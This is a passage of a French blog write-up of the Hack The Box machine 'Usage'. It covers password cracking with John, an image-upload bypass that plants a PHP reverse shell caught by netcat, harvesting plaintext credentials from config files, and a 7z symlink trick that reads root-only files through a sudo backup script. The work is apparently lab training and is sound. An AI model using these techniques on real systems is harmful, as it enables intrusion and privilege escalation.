+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john hash.txt --wordlist<span class=o>=</span>~/wordlists/rockyou.txt
+</span></span><span class=line><span class=cl>Loaded <span class=m>2</span> password hashes with <span class=m>2</span> different salts <span class=o>(</span>bcrypt <span class=o>[</span>Blowfish 32/64 X2<span class=o>])</span>
+</span></span><span class=line><span class=cl>Remaining <span class=m>1</span> password <span class=nb>hash</span>
+</span></span><span class=line><span class=cl>Will run <span class=m>8</span> OpenMP threads
+</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
+</span></span><span class=line><span class=cl>0g 0:00:00:20 0% 0g/s 45.39p/s 45.39c/s 45.39C/s wesley..sandy
+</span></span><span class=line><span class=cl>whatever1        <span class=o>(</span>?<span class=o>)</span>
+</span></span><span class=line><span class=cl>1g 0:00:00:34 100% 0.02906g/s 47.42p/s 47.42c/s 47.42C/s alexis1..punkrock
+</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class=line><span class=cl>Session completed
+</span></span><span class=line><span class=cl>~/github/Hacking/HackTheBox/Machines/Usage <span class=o>(</span>main*<span class=o>)</span> » john hash.txt --wordlist<span class=o>=</span>~/wordlists/rockyou.txt --show                                                       leopold@leopold-ZenBook-UX434FAC-UX434FA
+</span></span><span class=line><span class=cl>Invalid options combination or duplicate option: <span class=s2>&#34;--show&#34;</span>
+</span></span><span class=line><span class=cl>~/github/Hacking/HackTheBox/Machines/Usage <span class=o>(</span>main*<span class=o>)</span> » john hash.txt --show
+</span></span><span class=line><span class=cl>?:xander
+</span></span><span class=line><span class=cl>?:whatever1
+</span></span></code></pre></td></tr></table></div></div><h3 id=php-web-shell---dash-user>PHP web shell - dash user</h3><p>On peut désormais se connecter sur la plateforme admin. Le lien de ce sous-domaine etait disponible sur la page d&rsquo;accueil.
+En se connectant, on trouve une page settings permettant de modifier l&rsquo;avatar de l&rsquo;utilisateur <strong>admin</strong>.</p><p>On peut alors upload un fichier image. On peut alors cacher un reverse shell dans un fichier <strong>gif</strong> ou un autre format. Au moment de l&rsquo;upload, on intercepte la requete avec Burp et on modifie le nom du fichier en &ldquo;.php&rdquo;.</p><p>Un bouton s&rsquo;affiche sur la page nous permettant de download le fichier image. En recuperant le lien, on trouve donc où est situé le fichier (et où est le dossiers avec les uploads) :
+<a class=link href=http://admin.usage.htb/uploads/images/revshell.php target=_blank rel=noopener>http://admin.usage.htb/uploads/images/revshell.php</a></p><p>Il ne nous reste plus qu&rsquo;a ouvrir un netcat sur notre machine personelle et d&rsquo;ouvrir un shell sur la machine pour recuperer le flag utilisateur :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nc -lvnp <span class=m>6789</span>
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>6789</span>
+</span></span><span class=line><span class=cl>Connection received on 10.10.11.18 <span class=m>35690</span>
+</span></span><span class=line><span class=cl>Linux usage 5.15.0-101-generic <span class=c1>#111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class=line><span class=cl> 23:32:32 up  1:54,  <span class=m>0</span> users,  load average: 2.39, 2.47, 2.58
+</span></span><span class=line><span class=cl>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>dash<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>dash<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>dash<span class=o>)</span>
+</span></span><span class=line><span class=cl>/bin/sh: 0: can<span class=s1>&#39;t access tty; job control turned off
+</span></span></span><span class=line><span class=cl><span class=s1>$ python3 -c &#39;</span>import pty<span class=p>;</span>pty.spawn<span class=o>(</span><span class=s2>&#34;/bin/bash&#34;</span><span class=o>)</span><span class=err>&#39;</span>
+</span></span><span class=line><span class=cl>dash@usage:/$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
+</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
+</span></span><span class=line><span class=cl>dash@usage:/$ ^Z
+</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>21472</span> suspended  nc -lvnp <span class=m>6789</span>
+</span></span><span class=line><span class=cl>~/github/Hacking/HackTheBox/Machines/Usage <span class=o>(</span>main*<span class=o>)</span> » stty raw -echo<span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>  + <span class=m>21472</span> continued  nc -lvnp <span class=m>6789</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>dash@usage:/$ whoami
+</span></span><span class=line><span class=cl>dash
+</span></span><span class=line><span class=cl>dash@usage:/$ ls
+</span></span><span class=line><span class=cl>bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
+</span></span><span class=line><span class=cl>boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
+</span></span><span class=line><span class=cl>dash@usage:/$ <span class=nb>cd</span>
+</span></span><span class=line><span class=cl>dash@usage:~$ ls
+</span></span><span class=line><span class=cl>user.txt
+</span></span><span class=line><span class=cl>dash@usage:~$ <span class=nb>pwd</span>
+</span></span><span class=line><span class=cl>/home/dash
+</span></span><span class=line><span class=cl>dash@usage:~$ cat user.txt
+</span></span><span class=line><span class=cl>5313.....4bcc
+</span></span></code></pre></td></tr></table></div></div><p>Pour exploiter la faille, il fallait donc au minimum selectionner un fichier avec la bonne extension image (et le bon magic byte ? J&rsquo;avais mis GIF8 au début du fichier au cas où). Une fois passer cette étape, en appuyant sur submit et en modifiant la requete au vol, il n&rsquo;y a plus de vérification sur le fichier envoyé donc on peut changer en php il n&rsquo;y aura aucun probleme.</p><h2 id=dash---xander>dash -> xander</h2><h3 id=mmonit-service--user-password->mmonit service : user password ?</h3><p>Le serveur utilise le service mmonit. On peut trouver un fichier .monitrc intéressant sur le serveur:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat .monitrc 
+</span></span><span class=line><span class=cl><span class=c1>#Monitoring Interval in Seconds</span>
+</span></span><span class=line><span class=cl><span class=nb>set</span> daemon  <span class=m>60</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#Enable Web Access</span>
+</span></span><span class=line><span class=cl><span class=nb>set</span> httpd port <span class=m>2812</span>
+</span></span><span class=line><span class=cl>     use address 127.0.0.1
+</span></span><span class=line><span class=cl>     allow admin:3nc0d3d_pa<span class=nv>$$</span>w0rd
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#Apache</span>
+</span></span><span class=line><span class=cl>check process apache with pidfile <span class=s2>&#34;/var/run/apache2/apache2.pid&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> cpu &gt; 80% <span class=k>for</span> <span class=m>2</span> cycles <span class=k>then</span> alert
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#System Monitoring </span>
+</span></span><span class=line><span class=cl>check system usage
+</span></span><span class=line><span class=cl>    <span class=k>if</span> memory usage &gt; 80% <span class=k>for</span> <span class=m>2</span> cycles <span class=k>then</span> alert
+</span></span><span class=line><span class=cl>    <span class=k>if</span> cpu usage <span class=o>(</span>user<span class=o>)</span> &gt; 70% <span class=k>for</span> <span class=m>2</span> cycles <span class=k>then</span> alert
+</span></span><span class=line><span class=cl>        <span class=k>if</span> cpu usage <span class=o>(</span>system<span class=o>)</span> &gt; 30% <span class=k>then</span> alert
+</span></span><span class=line><span class=cl>    <span class=k>if</span> cpu usage <span class=o>(</span><span class=nb>wait</span><span class=o>)</span> &gt; 20% <span class=k>then</span> alert
+</span></span><span class=line><span class=cl>    <span class=k>if</span> loadavg <span class=o>(</span>1min<span class=o>)</span> &gt; <span class=m>6</span> <span class=k>for</span> <span class=m>2</span> cycles <span class=k>then</span> alert 
+</span></span><span class=line><span class=cl>    <span class=k>if</span> loadavg <span class=o>(</span>5min<span class=o>)</span> &gt; <span class=m>4</span> <span class=k>for</span> <span class=m>2</span> cycles <span class=k>then</span> alert
+</span></span><span class=line><span class=cl>    <span class=k>if</span> swap usage &gt; 5% <span class=k>then</span> alert
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>check filesystem rootfs with path /
+</span></span><span class=line><span class=cl>       <span class=k>if</span> space usage &gt; 80% <span class=k>then</span> alert
+</span></span></code></pre></td></tr></table></div></div><p>On trouve les creds:
+allow admin:3nc0d3d_pa$$w0rd</p><h3 id=xander-user-pwned>Xander user pwned</h3><p>Le mdp est en fait celui de l&rsquo;utilisateur xander&mldr; Dans le /home on observe bien un dossier &ldquo;xander&rdquo; que je n&rsquo;avais pas vu dans un premier temps :</p><blockquote><p>xander : 3nc0d3d_pa$$w0rd</p></blockquote><h2 id=xander---root>xander -> root</h2><h3 id=mysql-password>mysql password</h3><p>Dans le fichier .env du site web :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>DB_CONNECTION</span><span class=o>=</span>mysql
+</span></span><span class=line><span class=cl><span class=nv>DB_HOST</span><span class=o>=</span>127.0.0.1
+</span></span><span class=line><span class=cl><span class=nv>DB_PORT</span><span class=o>=</span><span class=m>3306</span>
+</span></span><span class=line><span class=cl><span class=nv>DB_DATABASE</span><span class=o>=</span>usage_blog
+</span></span><span class=line><span class=cl><span class=nv>DB_USERNAME</span><span class=o>=</span>staff
+</span></span><span class=line><span class=cl><span class=nv>DB_PASSWORD</span><span class=o>=</span>s3cr3t_c0d3d_1uth
+</span></span></code></pre></td></tr></table></div></div><h3 id=backup-script-as-root>Backup script as root</h3><p>Voir references pour comprendre l&rsquo;exploit. Mais en gros on peut faire sudo d&rsquo;une commande qui fait la backup du site web. Donc des fichiers dans /var/www/html. On peut créer un lien symbolique vers le fichier du flag /root/root.txt et grâce à une faille, avec un fichier @root.txt et à l&rsquo;execution de 7z, on peut recuperer l&rsquo;interieur du fichier. Voir references hacktricks.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>xander@usage:/var/www/html$ touch @root.txt
+</span></span><span class=line><span class=cl>xander@usage:/var/www/html$ ln -s /root/root.txt root.txt
+</span></span><span class=line><span class=cl>xander@usage:/var/www/html$ sudo /usr/bin/usage_management 
+</span></span><span class=line><span class=cl>Choose an option:
+</span></span><span class=line><span class=cl>1. Project Backup
+</span></span><span class=line><span class=cl>2. Backup MySQL data
+</span></span><span class=line><span class=cl>3. Reset admin password
+</span></span><span class=line><span class=cl>Enter your choice <span class=o>(</span>1/2/3<span class=o>)</span>: <span class=m>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>7-Zip <span class=o>(</span>a<span class=o>)</span> <span class=o>[</span>64<span class=o>]</span> 16.02 : Copyright <span class=o>(</span>c<span class=o>)</span> 1999-2016 Igor Pavlov : 2016-05-21
+</span></span><span class=line><span class=cl>p7zip Version 16.02 <span class=o>(</span><span class=nv>locale</span><span class=o>=</span>en_US.UTF-8,Utf16<span class=o>=</span>on,HugeFiles<span class=o>=</span>on,64 bits,2 CPUs AMD EPYC <span class=m>7513</span> 32-Core Processor                 <span class=o>(</span>A00F11<span class=o>)</span>,ASM,AES-NI<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Open archive: /var/backups/project.zip
+</span></span><span class=line><span class=cl>--       
+</span></span><span class=line><span class=cl><span class=nv>Path</span> <span class=o>=</span> /var/backups/project.zip
+</span></span><span class=line><span class=cl><span class=nv>Type</span> <span class=o>=</span> zip
+</span></span><span class=line><span class=cl>Physical <span class=nv>Size</span> <span class=o>=</span> <span class=m>54851331</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Scanning the drive:
+</span></span><span class=line><span class=cl>          
+</span></span><span class=line><span class=cl>WARNING: No more files
+</span></span><span class=line><span class=cl>0e99.....4e1b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>2984</span> folders, <span class=m>17981</span> files, <span class=m>114323032</span> bytes <span class=o>(</span><span class=m>110</span> MiB<span class=o>)</span>                         
+</span></span></code></pre></td></tr></table></div></div><h2 id=references>References</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> /path/to/7z/acting/folder
+</span></span><span class=line><span class=cl>touch @root.txt
+</span></span><span class=line><span class=cl>ln -s /file/you/want/to/read root.txt
+</span></span></code></pre></td></tr></table></div></div><p>Then, when 7z is execute, it will treat root.txt as a file containing the list of files it should compress (thats what the existence of @root.txt indicates) and when it 7z read root.txt it will read /file/you/want/to/read and as the content of this file isn&rsquo;t a list of files, it will throw and error showing the content.</p><p><a class=link href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----16397895490f--------------------------------" target=_blank rel=noopener>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----16397895490f--------------------------------</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/linux/>Linux</a>
+<a href=/tags/easy/>Easy</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/linkvortex-htb/><div class=article-details><h2 class=article-title>HTB | Linkvortex</h2></div></a></article><article><a href=/p/pandora-htb/><div class=article-details><h2 class=article-title>HTB | Pandora</h2></div></a></article><article><a href=/p/networked-htb/><div class=article-details><h2 class=article-title>HTB | Networked</h2></div></a></article><article><a href=/p/editor-htb/><div class=article-details><h2 class=article-title>HTB | Editor</h2></div></a></article><article><a href=/p/help-htb/><div class=article-details><h2 class=article-title>HTB | Help</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2026 leopoldabgn's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
